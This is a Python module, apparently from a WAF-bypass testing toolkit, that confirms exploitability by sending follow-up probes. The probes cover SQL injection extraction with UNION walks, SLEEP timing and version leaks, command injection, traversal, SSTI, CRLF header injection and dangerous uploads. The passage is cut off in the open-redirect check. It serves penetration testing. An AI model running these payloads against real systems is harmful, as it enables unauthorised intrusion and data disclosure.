"""Class-specific semantic verification of THROUGH payloads.

The search engine's oracle only answers "did this get past the WAF?" (BLOCKED /
THROUGH / DOWN). A THROUGH verdict proves the mutated payload reached the
origin — it does NOT prove the underlying vulnerability actually fired. A WAF
bypass that reaches the app but gets neutralized there (escaped, parameterized,
sandboxed, etc.) is a false positive for "exploitable".

Each `_check_*` function below sends one or two extra, carefully-crafted
requests through the same `Oracle` used by the rest of the toolchain and
inspects the *response body* for class-specific evidence that the exploit
actually executed. These are heuristics, not proof — `Verification.reason`
says plainly what was (and wasn't) actually confirmed, and `confidence` is a
float in [0, 1] reflecting how strong that evidence is.
"""
from __future__ import annotations

import base64
import json as _json
import re
import random
import secrets
import subprocess
import urllib.parse
from dataclasses import dataclass

from ..core.oracle import apply_auth


@dataclass
class Verification:
    exploitable: bool
    confidence: float
    reason: str
    attack_class: str


def _send(oracle, payload: str, retries: int = 2):
    """Send a verification probe, retrying briefly on a transient DOWN.

    Verification issues only 1-2 high-value requests per finding; if one of them
    transiently fails (DOWN: timeout / 000 / 502), a naive checker reads the empty
    body as 'exploit not confirmed' — a FALSE NEGATIVE that silently discards a real
    bypass. A couple of quick retries on DOWN (the oracle already backs off between
    sends) turns a flaky transport back into a decisive verdict."""
    resp = oracle.send(payload)
    attempts = 0
    while getattr(resp, "verdict", "") == "DOWN" and attempts < retries:
        attempts += 1
        resp = oracle.send(payload)
    return resp


# ---------------------------------------------------------------------------
# XSS Injection
# ---------------------------------------------------------------------------
_TAG_PATTERN = re.compile(r"<\s*(script|img|svg|iframe|body|details)\b", re.I)
_EVENT_PATTERN = re.compile(r"on[a-z]+\s*=", re.I)


def _check_xss(oracle, payload: str, attack_class: str) -> Verification:
    """Reflected-XSS heuristic.

    Confirms the payload reflects verbatim (not HTML-entity-encoded) in the
    response body, and that it still carries an executable-context marker
    (a tag like <script>/<svg>, or an on*= event handler, or javascript:).
    A verbatim-but-encoded reflection (&lt;script&gt;) is explicitly treated
    as NOT exploitable — that's exactly the "got through as garbage" case
    this verifier exists to catch.
    """
    resp = _send(oracle, payload)
    body = resp.body or ""
    if not body:
        return Verification(False, 0.1, "empty response body; cannot confirm reflection", attack_class)

    body_l = body.lower()
    reflected_raw = payload.lower() in body_l
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
    reflected_escaped = escaped.lower() in body_l and escaped != payload

    if reflected_escaped and not reflected_raw:
        return Verification(False, 0.85,
                             "payload reflected but HTML-entity encoded — not executable", attack_class)

    if reflected_raw:
        if _TAG_PATTERN.search(body) or _EVENT_PATTERN.search(body) or "javascript:" in body_l:
            return Verification(True, 0.85,
                                 "payload reflected verbatim with an unescaped executable-context marker"
                                 " (tag/event-handler/javascript:)", attack_class)
        return Verification(True, 0.5,
                             "payload reflected verbatim, but no distinct executable marker found "
                             "near it — likely exploitable but unconfirmed context", attack_class)

    return Verification(False, 0.3, "payload not found reflected anywhere in the response body", attack_class)


# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------
_SQL_ERROR_PATTERNS = [
    r"sql syntax.*mysql", r"warning:\s*mysql_", r"mysql_fetch_array",
    r"ora-\d{5}", r"postgresql.*error", r"pg_query\(\)", r"sqlite3::",
    r"unclosed quotation mark", r"microsoft ole db provider for sql server",
    r"sqlstate\[", r"you have an error in your sql syntax",
    # SQLite / Sequelize (Node ORMs, e.g. OWASP Juice Shop) — the literal engine
    # error string ("SQLITE_ERROR: near \"...\": syntax error") and ORM wrappers.
    r"sqlite_error", r"sqlite3?[._]\w*error", r"unrecognized token",
    r"sequelize\w*error", r"\bsequelize\b",
]


def _flip_boolean(payload: str) -> str | None:
    """Best-effort: turn a true-ish boolean payload into its false counterpart."""
    pairs = [
        ("1=1", "1=2"), ("'1'='1'", "'1'='2'"), ("'1'='1", "'1'='2"),
        ("1=='1'", "1=='2'"), ("or 1=1", "or 1=2"), ("OR 1=1", "OR 1=2"),
    ]
    for true_tok, false_tok in pairs:
        if true_tok in payload:
            return payload.replace(true_tok, false_tok)
    return None


def _check_sqli(oracle, payload: str, attack_class: str) -> Verification:
    """Error-based or boolean-differential heuristic.

    First looks for a verbatim DB error signature in the response (strong,
    direct evidence the DB parsed the injected syntax). Failing that, it
    flips the boolean sense of the payload (1=1 -> 1=2, etc.) and compares
    the two responses: a meaningful size/body differential between the
    "true" and "false" variants is evidence of a working boolean-blind SQLi.
    """
    resp_true = _send(oracle, payload)
    body = resp_true.body or ""
    for pat in _SQL_ERROR_PATTERNS:
        if re.search(pat, body, re.I):
            return Verification(True, 0.8, f"database error signature matched in response ({pat!r})",
                                 attack_class)

    false_variant = _flip_boolean(payload)
    if false_variant is None or false_variant == payload:
        deep = _sqli_deep_confirm(oracle, payload, attack_class)
        if deep is not None:
            return deep
        return Verification(False, 0.2,
                             "no SQL error signature found, no recognizable boolean clause to "
                             "differential-test, and UNION column-count / time-based probes did not "
                             "confirm either", attack_class)

    resp_false = _send(oracle, false_variant)
    if resp_true.body == resp_false.body:
        deep = _sqli_deep_confirm(oracle, payload, attack_class)
        if deep is not None:
            return deep
        return Verification(False, 0.4,
                             "true/false variants produced byte-identical responses; "
                             "no boolean differential observed", attack_class)

    denom = max(resp_true.size, resp_false.size, 1)
    size_delta_ratio = abs(resp_true.size - resp_false.size) / denom
    if resp_true.verdict == "THROUGH" and size_delta_ratio > 0.02:
        return Verification(True, 0.7,
                             f"boolean differential: true-variant size={resp_true.size} vs "
                             f"false-variant size={resp_false.size} (Δ={size_delta_ratio:.1%})",
                             attack_class)

    deep = _sqli_deep_confirm(oracle, payload, attack_class)
    if deep is not None:
        return deep
    return Verification(False, 0.3,
                         "true/false variants differ slightly but not enough to confirm a boolean "
                         "differential, and UNION column-count / time-based probes did not confirm",
                         attack_class)


# -- deeper SQLi confirmation: UNION column-count + time-based blind ----------
# Real DB errors emitted when a UNION's column count is wrong. When the count finally
# MATCHES, this error disappears and the query succeeds, so an ascending
# "UNION SELECT NULL,.." walk that watches for that transition both confirms the
# injection AND recovers the column count.
_UNION_COLUMN_ERRORS = re.compile(
    r"different number of columns|"
    r"must have the same number of (result )?columns|"
    r"equal number of expressions in their target lists|"
    r"ora-01789|"
    r"do(es)? not have the same number of result columns|"
    r"number of columns (does not|doesn't) match",
    re.I)


def _sql_context_wrappers(payload: str) -> list[str]:
    """Up to two best-effort clause-terminators to break out of the original SQL
    context before appending our own tail: a single/double quote if the payload uses
    one, plus the bare (numeric / already-broken-out) context. Bounded on purpose."""
    out: list[str] = []
    if "'" in payload:
        out.append("'")
    if '"' in payload:
        out.append('"')
    out.append("")                       # numeric / no-quote context
    uniq: list[str] = []
    for w in out:
        if w not in uniq:
            uniq.append(w)
        if len(uniq) >= 2:               # stay bounded
            break
    return uniq


# Deep-SQLi request budget: the UNION column-count walk probes up to this many
# columns per context wrapper (and wrappers are capped at 2), so the deep-confirm
# stays bounded (~a dozen extra sends) and never balloons a verified run.
_UNION_MAX_COLS = 6


def _sqli_union_confirm(oracle, payload: str, attack_class: str, max_cols: int = _UNION_MAX_COLS):
    """Ascending UNION column-count probe.

    For each context wrapper, injects `UNION SELECT NULL`, `UNION SELECT NULL,NULL`,
    ... and watches for a SQL (ideally column-count-mismatch) error that is present
    for too-few columns and then VANISHES at some count N with a clean THROUGH — the
    UNION balanced, which both proves the injection and pins the column count at N.
    Returns a positive Verification on that transition, else None (inconclusive)."""
    for wrap in _sql_context_wrappers(payload):
        saw_col_error = False
        saw_any_error = False
        for n in range(1, max_cols + 1):
            nulls = ",".join(["NULL"] * n)
            probe = f"{wrap} UNION SELECT {nulls}-- -" if wrap else f"UNION SELECT {nulls}-- -"
            resp = _send(oracle, probe)
            b = resp.body or ""
            col_err = bool(_UNION_COLUMN_ERRORS.search(b))
            any_err = col_err or any(re.search(p, b, re.I) for p in _SQL_ERROR_PATTERNS)
            if any_err:
                saw_col_error = saw_col_error or col_err
                saw_any_error = True
                continue
            if saw_col_error and resp.verdict == "THROUGH":
                return Verification(True, 0.82,
                                     f"UNION column-count confirmed: a column-count-mismatch error "
                                     f"appeared for fewer columns and DISAPPEARED at {n} column(s) "
                                     f"(HTTP {resp.code or '?'}) — injectable UNION with {n} columns",
                                     attack_class)
            if saw_any_error and resp.verdict == "THROUGH":
                return Verification(True, 0.72,
                                     f"UNION column-count confirmed: a SQL error present for fewer "
                                     f"columns cleared at {n} column(s) (HTTP {resp.code or '?'}) — the "
                                     f"injected UNION SELECT balanced, confirming the injection point",
                                     attack_class)
    return None


# Time-based blind: a vulnerable backend that EXECUTES an injected delay function
# responds measurably slower than for a 0-second control; an un-injectable one runs
# neither and the two times match. We require a clear absolute AND relative jump so
# ordinary network jitter can't trip it.
_SQLI_TIME_FUNCS = [
    ("MySQL/MariaDB SLEEP", "SLEEP({s})"),
    ("PostgreSQL pg_sleep", "pg_sleep({s})"),
]


def _sqli_timing_confirm(oracle, payload: str, attack_class: str, delay_s: int = 3):
    """SLEEP/pg_sleep differential. For a couple of engines/contexts, send a
    `delay_s`-second delay probe and a matched 0-second control; confirm only when
    the delay response is slower by at least ~60% of the requested delay in BOTH
    absolute terms and versus the control. A non-vulnerable target never runs the
    sleep, so this stays fast; returns a positive Verification on the jump, else None."""
    threshold = delay_s * 0.6
    for wrap in _sql_context_wrappers(payload):
        lead = f"{wrap} OR " if wrap else "1 OR "
        for label, tmpl in _SQLI_TIME_FUNCS:
            delay_probe = f"{lead}{tmpl.format(s=delay_s)}-- -"
            zero_probe = f"{lead}{tmpl.format(s=0)}-- -"
            control = _send(oracle, zero_probe)
            if control.verdict == "DOWN":
                continue
            delayed = _send(oracle, delay_probe)
            if delayed.verdict == "DOWN":
                continue
            if delayed.time >= threshold and (delayed.time - control.time) >= threshold:
                return Verification(True, 0.78,
                                     f"time-based blind SQLi confirmed: '{label}' delay probe took "
                                     f"{delayed.time:.2f}s vs {control.time:.2f}s for the 0-second "
                                     f"control (Δ≈{delayed.time - control.time:.2f}s ≥ {threshold:.1f}s) "
                                     f"— the backend executed the injected delay", attack_class)
    return None


# -- strongest SQLi confirmation: DATA EXTRACTION (a DB-evaluated marker) -------
# Confirming injection is not the same as PROVING exploitation. The error-signature,
# boolean, UNION-count and timing signals above all show only "the DB parsed our
# syntax" — none return a concrete value the DB actually COMPUTED. This step closes
# that gap the way sqlmap does: it injects an arithmetic marker a*b (two random
# factors, exactly like `_check_ssti`'s product trick) wrapped in '~' delimiters
# (CHAR(126)/CHR(126)/0x7e) and looks for the DB-computed product "~<a*b>~" in the
# response. The product itself NEVER appears in the probe text, so finding it proves
# the engine evaluated our expression server-side — honest proof-of-exploitation
# (a concrete DB-evaluated value), not a full data dumper.
#
# Two delivery channels, chosen so the syntaxes degrade gracefully across engines
# (payloads grounded in PayloadsAllTheThings, "SQL Injection/<engine> Injection.md"):
#   * error-based — forces the value into a DB error string; needs NO column count:
#       MySQL/MariaDB  EXTRACTVALUE/UPDATEXML raise an XPATH error echoing their
#                      (invalid) 2nd arg      ("MySQL Injection.md")
#       PostgreSQL     CAST(text AS NUMERIC) raises "invalid input syntax for type
#                      numeric: <text>"       ("PostgreSQL Injection.md")
#       MSSQL          CONVERT(INT,<varchar>) raises "Conversion failed when
#                      converting the varchar value '<text>'"  ("MSSQL Injection.md")
#   * UNION-based  — SELECTs the marker across a column walk until the UNION balances
#                      and the value renders; covers SQLite, whose loose typing has no
#                      handy error-based channel, and any engine whose DB errors the
#                      app suppresses          ("SQLite Injection.md")
# String ops differ per engine: MySQL's `||` is logical OR unless PIPES_AS_CONCAT is
# set (dev.mysql.com/doc/refman/8.0/en/logical-operators.html), so MySQL uses CONCAT;
# PostgreSQL/SQLite/Oracle use `||`; MSSQL uses `+` with CAST(... AS VARCHAR). On the
# error-based probes a `@@version`/`version()` token is appended, so a hit can also
# quote the engine banner for free. Bounded (error-based ≤ wrappers*len(exprs); UNION
# ≤ wrappers*len(exprs)*max_cols) and short-circuits on the first extracted value;
# never raises (guarded by `_sqli_deep_confirm`).


def _sqli_extract_exprs(a: int, b: int):
    """DB-dialect expressions that evaluate to the '~<a*b>~' marker (a version token
    appended to the error-based ones, where the engine exposes it for free). Returns
    (product, needle, error_exprs, union_exprs)."""
    product = a * b
    arith = f"({a}*{b})"
    # CHAR(126)=CHR(126)='~'. @@version (MySQL/MSSQL) / version() (PostgreSQL) ride
    # along on the error-based channel as an optional, quoted-in-the-reason bonus.
    error_exprs = [
        ("MySQL/MariaDB EXTRACTVALUE",
         f"EXTRACTVALUE(RAND(),CONCAT(CHAR(126),{arith},CHAR(126),@@version,CHAR(126)))"),
        ("PostgreSQL CAST",
         f"CAST(CHR(126)||({arith})::text||CHR(126)||version()||CHR(126) AS NUMERIC)"),
        ("MSSQL CONVERT",
         f"CONVERT(INT,CHAR(126)+CAST({arith} AS VARCHAR)+CHAR(126)+@@version+CHAR(126))"),
    ]
    union_exprs = [
        ("MySQL/MariaDB", f"CONCAT(CHAR(126),{arith},CHAR(126))"),
        ("PostgreSQL/SQLite/Oracle", f"'~'||({arith})||'~'"),
        ("MSSQL", f"CHAR(126)+CAST({arith} AS VARCHAR)+CHAR(126)"),
    ]
    return product, f"~{product}~", error_exprs, union_exprs


def _sqli_extract_confirm(oracle, payload: str, attack_class: str, max_cols: int = 5):
    """DATA-EXTRACTION confirmation: prove the DB actually COMPUTED an injected value.

    Injects an arithmetic marker a*b (random factors) and confirms only when the
    DB-evaluated product "~<a*b>~" — which never appears literally in the probe —
    comes back in the response, via an error-based (no column count) or UNION-based
    (column walk) channel across MySQL/MariaDB, PostgreSQL, SQLite and MSSQL. On a
    hit returns a HIGH-confidence Verification quoting the extracted value (and any
    version token riding along); otherwise None. Bounded, short-circuits on the first
    value, and never raises (see `_sqli_deep_confirm`)."""
    a, b = random.randint(100, 999), random.randint(100, 999)
    product, needle, error_exprs, union_exprs = _sqli_extract_exprs(a, b)

    def _hit(resp, label, technique, want_version):
        body = resp.body or ""
        if needle not in body:
            return None
        extra = ""
        if want_version:                     # grab the banner sitting just past the marker
            m = re.search(re.escape(needle) + r"([^~<>]{3,60})", body)
            if m:
                vt = m.group(1).strip()
                if re.search(r"\d|MariaDB|MySQL|PostgreSQL|SQL Server|SQLite|Oracle", vt, re.I):
                    extra = f" and leaked the version token '{vt[:48]}'"
        return Verification(True, 0.95,
                            f"DATA EXTRACTION confirmed: the DB evaluated our injected arithmetic "
                            f"{a}*{b}={product} and returned the delimited marker '{needle}' via "
                            f"{label} {technique}{extra} — concrete proof the backend executed our "
                            f"SQL server-side (not merely that the WAF let the payload pass)",
                            attack_class)

    # (1) error-based: cheapest, needs no column count — try it first.
    for wrap in _sql_context_wrappers(payload):
        lead = f"{wrap} AND " if wrap else "1 AND "
        for label, expr in error_exprs:
            v = _hit(_send(oracle, f"{lead}{expr}-- -"), label, "error-based extraction", True)
            if v is not None:
                return v

    # (2) UNION-based: walk the column count until the UNION balances and the marker
    #     renders (marker in every column so whichever one is displayed surfaces it).
    for wrap in _sql_context_wrappers(payload):
        for label, expr in union_exprs:
            for n in range(1, max_cols + 1):
                sel = ",".join([expr] * n)
                probe = f"{wrap} UNION SELECT {sel}-- -" if wrap else f"UNION SELECT {sel}-- -"
                v = _hit(_send(oracle, probe), label, f"UNION SELECT with {n} column(s)", False)
                if v is not None:
                    return v
    return None


def _sqli_deep_confirm(oracle, payload: str, attack_class: str):
    """Deeper SQLi confirmation used only after `_check_sqli`'s error-signature and
    boolean-differential heuristics come up empty: first a DATA-EXTRACTION probe that
    tries to make the DB compute and return a concrete marker value (the strongest
    signal), then the bounded UNION column-count walk, then a time-based blind probe.
    Returns a positive Verification or None, and never raises (verification must stay
    crash-proof)."""
    try:
        hit = _sqli_extract_confirm(oracle, payload, attack_class)  # strongest: a DB-evaluated value
        if hit is not None:
            return hit
        hit = _sqli_union_confirm(oracle, payload, attack_class)
        if hit is not None:
            return hit
        return _sqli_timing_confirm(oracle, payload, attack_class)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------
_CMD_WORDS = ["uname -a", "cat /etc/passwd", "whoami", "ls -la", "ls", "id"]


def _check_cmdi(oracle, payload: str, attack_class: str) -> Verification:
    """Benign echo-marker technique.

    Swaps the command word in the payload for `echo <unique-token>` (preserving
    whatever separator/injection syntax the bypass found — ;, |, &&, $(), ``).
    If the token comes back verbatim in the response body, the shell actually
    executed our injected command — direct proof of command execution, with no
    destructive side effects.
    """
    token = f"wfx{random.randint(100000, 999999)}"
    variant = None
    for word in _CMD_WORDS:
        if word in payload:
            variant = payload.replace(word, f"echo {token}")
            break
    if variant is None:
        # no recognizable command word — append a benign echo using the
        # payload's own injection syntax, best-effort.
        variant = payload + f";echo {token}"

    resp = _send(oracle, variant)
    body = resp.body or ""
    if token in body:
        return Verification(True, 0.85,
                             f"injected echo marker '{token}' appeared verbatim in response body "
                             "— command execution confirmed", attack_class)
    return Verification(False, 0.3,
                         "echo-marker probe did not appear in the response; command execution "
                         "not confirmed (THROUGH may just mean the WAF let inert text past)",
                         attack_class)


# ---------------------------------------------------------------------------
# Directory Traversal / File Inclusion
# ---------------------------------------------------------------------------
_PASSWD_RE = re.compile(r"root:.*?:0:0:", re.I)
_WININI_MARKERS = ("[boot loader]", "for 16-bit app support")
_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/]{40,}={0,2}")


def _check_traversal(oracle, payload: str, attack_class: str) -> Verification:
    """Looks for known file-disclosure content in the response body.

    Covers the classic /etc/passwd signature, a Windows win.ini signature, and
    the php://filter/convert.base64-encode trick (decodes long base64 blobs in
    the body and checks whether any of them is actually PHP source).
    """
    resp = _send(oracle, payload)
    body = resp.body or ""

    if _PASSWD_RE.search(body):
        return Verification(True, 0.9, "/etc/passwd signature ('root:...:0:0:') found in response body",
                             attack_class)

    if any(m in body.lower() for m in _WININI_MARKERS):
        return Verification(True, 0.8, "win.ini signature found in response body", attack_class)

    if "php://filter" in payload.lower():
        for m in _B64_BLOB_RE.finditer(body):
            blob = m.group(0)
            padded = blob + "=" * (-len(blob) % 4)
            try:
                decoded = base64.b64decode(padded, validate=False).decode("utf-8", errors="ignore")
            except Exception:
                continue
            if "<?php" in decoded.lower() or "<?=" in decoded:
                return Verification(True, 0.85,
                                     "base64 blob in response decodes to PHP source — "
                                     "php://filter wrapper confirmed working", attack_class)

    return Verification(False, 0.25,
                         "no known file-disclosure signature (/etc/passwd, win.ini, decoded PHP "
                         "source) found in the response body", attack_class)


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------
_SSTI_SYNTAXES = [
    (re.compile(r"\{\{.*?\}\}"), lambda a, b: f"{{{{{a}*{b}}}}}"),
    (re.compile(r"\$\{.*?\}"), lambda a, b: f"${{{a}*{b}}}"),
    (re.compile(r"<%=.*?%>"), lambda a, b: f"<%= {a}*{b} %>"),
    (re.compile(r"#\{.*?\}"), lambda a, b: f"#{{{a}*{b}}}"),
]


def _check_ssti(oracle, payload: str, attack_class: str) -> Verification:
    """Arithmetic-marker technique.

    Rewrites the template expression in the payload to multiply two random
    3-digit numbers and checks whether their (otherwise astronomically
    unlikely to appear by chance) product shows up in the response — proof
    the template engine actually evaluated our expression server-side.
    """
    a, b = random.randint(100, 199), random.randint(100, 199)
    product = a * b

    variant = None
    for pattern, build in _SSTI_SYNTAXES:
        if pattern.search(payload):
            variant = pattern.sub(build(a, b), payload, count=1)
            break
    if variant is None:
        variant = f"{{{{{a}*{b}}}}}"

    resp = _send(oracle, variant)
    body = resp.body or ""
    if str(product) in body:
        return Verification(True, 0.9,
                             f"arithmetic marker {a}*{b}={product} was evaluated and appeared in the "
                             "response — template evaluation confirmed", attack_class)
    return Verification(False, 0.3,
                         f"arithmetic marker {a}*{b}={product} did not appear in the response; "
                         "template evaluation not confirmed", attack_class)


# ---------------------------------------------------------------------------
# CRLF Injection
# ---------------------------------------------------------------------------
_CRLF_MARKER_NAME = "X-Waffen-CRLF"


def _fetch_headers(target, payload: str, timeout: int | None = None) -> str:
    """Self-contained `curl -i` header fetch.

    `Oracle.send()` only returns code/size/time/body — no headers — because
    the rest of the toolchain never needs them. CRLF/response-splitting
    verification is the exception: the only way to *prove* a CRLF payload
    split the response is to look at the raw header block. Rather than
    changing `Response` (out of scope — other files are off limits), this
    builds its own curl invocation with `-i` so headers are included in the
    output, using the same per-inject-point request shapes as
    `Oracle._build` (query/path/rawpath/body/json/header/cookie).

    Returns the raw header text (everything before the first blank line),
    or "" on any failure — callers must treat that as "headers unavailable"
    and fall back to a body-based check, not as "no CRLF".
    """
    try:
        t = target
        to = timeout or getattr(t, "timeout", 15)
        method = getattr(t, "method", "GET")
        param = getattr(t, "param", "q")
        inject = getattr(t, "inject", "query")
        url = t.base_url.rstrip("/") + t.path

        sec = t.curl_sec(with_i=True) if hasattr(t, "curl_sec") else "-sik"
        cmd = ["curl", sec, "-m", str(to), "-A", getattr(t, "user_agent", "WAFFEN/0.1")]
        if inject == "query":
            qp = urllib.parse.urlencode({param: payload})
            sep = "&" if "?" in url else "?"
            cmd += ["-X", method, f"{url}{sep}{qp}"]
        elif inject == "path":
            cmd += ["-X", method, f"{url}/{urllib.parse.quote(payload, safe='')}"]
        elif inject == "rawpath":
            enc = urllib.parse.quote(payload, safe="/.-_~")
            cmd += ["-X", method, f"{url.rstrip('/')}/{enc.lstrip('/')}"]
        elif inject == "body":
            cmd += ["-X", method, url, "-H", "Content-Type: application/x-www-form-urlencoded",
                    "--data-urlencode", f"{param}={payload}"]
        elif inject == "json":
            cmd += ["-X", method, url, "-H", "Content-Type: application/json",
                    "-d", _json.dumps({param: payload})]
        elif inject == "header":
            cmd += ["-X", method, url, "-H", f"{param}: {payload}"]
        elif inject == "cookie":
            cmd += ["-X", method, url, "-H", f"Cookie: {param}={payload}"]
        else:
            cmd += ["-X", method, url]

        cmd = apply_auth(cmd, t)  # thread --header/--cookie so CRLF verify works behind auth
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=to + 5).stdout
        for sep in ("\r\n\r\n", "\n\n"):
            if sep in out:
                return out.split(sep, 1)[0]
        return out
    except Exception:
        return ""


def _check_crlf(oracle, payload: str, attack_class: str) -> Verification:
    """CRLF-injection / HTTP response-splitting heuristic.

    The search engine hands us a payload that already got THROUGH carrying a
    CRLF sequence (raw `\\r\\n`, `%0d%0a`, `%0a`, etc.) — but a THROUGH verdict
    only means the WAF didn't block it, not that the backend actually honored
    the injected line break. To confirm, we append an attacker-controlled,
    unique marker header (`X-Waffen-CRLF: <random-token>`) onto the payload
    using both a URL-encoded CRLF (`%0d%0a...`) and a raw `\\r\\n...` variant,
    then look for it in two places:

      1. The response HEADERS (fetched via `_fetch_headers`, a dedicated
         curl -i call) — if our marker shows up as its own header line, the
         CRLF sequence split the HTTP response and injected a real header.
         That's direct, strong proof of response splitting (confidence 0.85).
      2. Failing that (headers unavailable, or marker not there), the
         response BODY from the normal oracle transport — if the raw marker
         token shows up there, the CR/LF bytes survived whatever sanitization
         happened, but we can't prove it actually split the response into a
         new header, so this is treated as a weaker signal (confidence 0.4).

    Neither signal present -> not confirmed.
    """
    token = f"wfxcrlf{secrets.token_hex(8)}"  # CSPRNG marker — unpredictable
    needle = f"{_CRLF_MARKER_NAME.lower()}: {token}".lower()
    variants = [
        payload + f"%0d%0a{_CRLF_MARKER_NAME}: {token}",
        payload + f"\r\n{_CRLF_MARKER_NAME}: {token}",
    ]

    for variant in variants:
        headers = _fetch_headers(oracle.t, variant)
        if headers and needle in headers.lower():
            return Verification(True, 0.85,
                                 f"injected marker header '{_CRLF_MARKER_NAME}: {token}' appeared "
                                 "verbatim in the response HEADERS — CRLF response-splitting "
                                 "confirmed", attack_class)

    for variant in variants:
        resp = _send(oracle, variant)
        body = resp.body or ""
        if token in body:
            return Verification(True, 0.4,
                                 f"injected marker token '{token}' reflected in the response BODY "
                                 "only — the CR/LF bytes passed through, but no confirmed header "
                                 "split was observed (response headers unavailable or unaffected)",
                                 attack_class)

    return Verification(False, 0.2,
                         "neither response headers nor body show the injected CRLF marker "
                         f"('{_CRLF_MARKER_NAME}: {token}') — CRLF injection not confirmed",
                         attack_class)


# ---------------------------------------------------------------------------
# NoSQL Injection
# ---------------------------------------------------------------------------
_NOSQL_ERROR_PATTERNS = [
    r"mongo\w*\s*(error|exception)", r"mongoerror", r"\be11000\b", r"\bbson\b",
    r"cast to objectid failed", r"unknown operator", r"\$where", r"unexpected token .*in json",
    r"couchdb", r"redis.*wrong number", r"unterminated string",
]


def _flip_nosql(payload: str) -> str | None:
    """Best-effort: turn an always-true NoSQL clause into an always-false one."""
    pairs = [
        ("[$ne]=1", "[$eq]=1"), ("[$ne]=", "[$eq]="), ("$ne", "$eq"),
        ("[$gt]=", "[$lt]="), ("'1'=='1'", "'1'=='2'"), ("1==1", "1==2"),
        ("||'1'=='1", "||'1'=='2"), ("' || '1'=='1", "' || '1'=='2"), ("true", "false"),
    ]
    for true_tok, false_tok in pairs:
        if true_tok in payload:
            return payload.replace(true_tok, false_tok, 1)
    return None


def _check_nosql(oracle, payload: str, attack_class: str) -> Verification:
    """NoSQL error-based or boolean-differential heuristic (mirrors _check_sqli).

    Looks first for a NoSQL engine error signature (Mongo/BSON/Couch/Redis), then
    flips an always-true operator clause ([$ne]->[$eq], ' || '1'=='1 -> ...'2', ...)
    and compares the true vs false responses: a meaningful size/body differential
    is evidence the injected operator actually changed the query's result set."""
    resp_true = _send(oracle, payload)
    body = resp_true.body or ""
    for pat in _NOSQL_ERROR_PATTERNS:
        if re.search(pat, body, re.I):
            return Verification(True, 0.7, f"NoSQL engine error signature matched in response ({pat!r})",
                                 attack_class)

    false_variant = _flip_nosql(payload)
    if false_variant is None or false_variant == payload:
        return Verification(False, 0.2,
                             "no NoSQL error signature, and payload has no recognizable always-true "
                             "clause to differential-test", attack_class)

    resp_false = _send(oracle, false_variant)
    if resp_true.body == resp_false.body:
        return Verification(False, 0.4,
                             "true/false NoSQL variants produced byte-identical responses; "
                             "no differential observed", attack_class)
    denom = max(resp_true.size, resp_false.size, 1)
    delta = abs(resp_true.size - resp_false.size) / denom
    if resp_true.verdict == "THROUGH" and delta > 0.02:
        return Verification(True, 0.65,
                             f"NoSQL boolean differential: true-variant size={resp_true.size} vs "
                             f"false-variant size={resp_false.size} (Δ={delta:.1%})", attack_class)
    return Verification(False, 0.3,
                         "true/false NoSQL variants differ slightly but not enough to confirm", attack_class)


# ---------------------------------------------------------------------------
# Upload Insecure Files
# ---------------------------------------------------------------------------
_UPLOAD_REJECT_RE = re.compile(
    r"(not allowed|invalid file|forbidden|illegal|unsupported|disallowed|"
    r"bad extension|file type not|not permitted|blocked|rejected|"
    r"only .{0,24}(jpg|jpeg|png|gif|pdf|image)s? (are )?(allowed|permitted|accepted))", re.I)


def _check_upload(oracle, payload: str, attack_class: str) -> Verification:
    """Insecure-file-upload heuristic.

    `payload` is the uploaded FILENAME the search got past the WAF (shell.phtml,
    'shell.php;.jpg', 'shell.php%00.jpg', ...). A THROUGH verdict only means the WAF
    did not block the multipart request — NOT that the application accepted the
    dangerous file. The oracle (inject=upload) re-sends the upload with an inert,
    marked probe file under that filename; we read the app's own reaction:

      - an explicit extension/type rejection  -> NOT exploitable (the app defends
        itself even though the WAF passed the request);
      - acceptance (2xx / THROUGH, no rejection text) -> the dangerous extension got
        in past BOTH the WAF and the app's own checks (confidence 0.55). We stop at
        'accepted': proving the file is then served/executed is app-specific and the
        probe content is deliberately inert (a marker, never a working shell).
    """
    resp = _send(oracle, payload)
    body = resp.body or ""
    if resp.verdict == "DOWN":
        return Verification(False, 0.2, "upload probe failed (transport DOWN); acceptance not confirmed",
                             attack_class)
    if _UPLOAD_REJECT_RE.search(body):
        return Verification(False, 0.6,
                             f"app rejected the dangerous upload '{payload}' — extension/type filtered at "
                             "the app layer (WAF let it pass, but the app defends itself)", attack_class)
    if resp.verdict == "THROUGH" and resp.code[:1] == "2":
        return Verification(True, 0.55,
                             f"app accepted the dangerous upload '{payload}' (HTTP {resp.code}, no extension "
                             "rejection) — it passed BOTH the WAF and the app; serving/execution not probed",
                             attack_class)
    return Verification(False, 0.3,
                         f"upload '{payload}' passed the WAF but the app's acceptance is unconfirmed "
                         f"(HTTP {resp.code or '?'}, no success or rejection signal)", attack_class)


# ---------------------------------------------------------------------------
# Open Redirect
# ---------------------------------------------------------------------------
def _authority_host(s: str) -> str:
    """Host (authority) of an absolute or scheme-relative URL, or "" when the string
    is relative / same-origin / hostless. Backslashes are folded to '/' first,
    matching how browsers parse redirect targets ('/\\evil' -> '//evil')."""
    if not s:
        return ""
    v = s.strip().replace("\\", "/")
    m = re.match(r"^\s*(?:[a-zA-Z][a-zA-Z0-9+.\-]*:)?//+([^/?#]*)", v)
    if m:
        authority = m.group(1)
    else:
        m2 = re.match(r"^\s*https?:([^/?#]+)$", v, re.I)   # scheme:host with no slashes
        if not m2:
            return ""
        authority = m2.group(1)
    if "@" in authority:                                   # strip userinfo
        authority = authority.rsplit("@", 1)[1]
    return authority.split(":", 1)[0].strip().lower()      # strip port


def _header_value(header_block: str, name: str) -> str:
    """First value of header `name` in a raw header block, or ""."""
    name_l = name.lower()
    for line in (header_block or "").splitlines():
        k, sep, val = line.partition(":")
        if sep and k.strip().lower() == name_l:
            return val.strip()
    return ""


def _check_open_redirect(oracle, payload: str, attack_class: str) -> Verification:
    """Open-redirect heuristic.

    A THROUGH only means the WAF let the redirect payload past — not that the app
    actually honors it. This fetches the raw response headers (via `_fetch_headers`,
    which issues its own `curl -i`) and confirms the `Location:` header's *authority*
    is the attacker-controlled host named in the payload — not merely that the host
    appears somewhere (e.g. echoed in a `?next=` query), which is treated as weak.
    """
    host = _authority_host(payload)
    if not host:
        return Verification(False, 0.2,
